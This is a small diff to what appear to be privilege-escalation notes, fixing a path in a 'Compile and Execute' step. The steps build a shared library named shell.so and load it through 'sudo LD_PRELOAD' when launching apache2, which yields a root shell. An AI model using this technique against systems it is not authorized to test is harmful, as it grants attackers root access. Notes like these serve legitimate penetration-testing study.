@@ -20,7 +20,7 @@ void _init() {
 ```
 ### Compile and Execute
 ```
-gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
 ls
 sudo LD_PRELOAD=/tmp/shell.so apache2
 id
